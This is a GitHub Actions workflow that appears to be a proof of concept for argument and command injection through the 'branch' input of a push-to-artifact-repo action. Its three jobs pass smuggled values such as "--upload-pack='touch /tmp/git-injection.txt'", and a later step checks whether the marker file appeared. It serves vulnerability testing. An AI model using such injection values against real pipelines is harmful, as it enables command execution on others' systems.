name: POC - Command Injection via branch input

on:
  workflow_dispatch:
  push:
    branches:
      - main

jobs:
  # Test 1: Word splitting causes multiple arguments to be passed
  exploit-word-splitting:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: POC - Word splitting demonstration
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          # Without quotes, spaces split into multiple arguments
          # This shows how unquoted vars break argument parsing
          email: "poc-test@example.com"
          name: "POC Tester"
          branch: "--version"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

  # Test 2: Newline injection - newlines in input may break command structure
  exploit-newline:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      
      - name: Create payload with newline
        run: |
          # Create a file to prove we reached this step
          echo "Testing newline injection" > /tmp/test-start.txt
          
      - name: POC - Test with special chars
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "poc-test@example.com"
          name: "POC Tester"  
          # Test glob expansion - * might expand to filenames
          branch: "main --delete-everything"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

      - name: Verify
        run: |
          echo "Word splitting test - extra arguments passed to bluehawk"
          echo "Check logs above for how --delete-everything was interpreted"

  # Test 3: Using shell through npm/node - test if bluehawk passes to shell
  exploit-via-git:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: POC - Injection that might reach git
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "poc-test@example.com"
          name: "POC Tester"
          # If bluehawk passes branch to git unsafely, this could inject
          branch: "main --upload-pack='touch /tmp/git-injection.txt'"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

      - name: Verify git injection
        run: |
          if [ -f /tmp/git-injection.txt ]; then
            echo "âœ… GIT INJECTION WORKED!"
          else
            echo "Git injection did not create file (may still show in logs)"
          fi
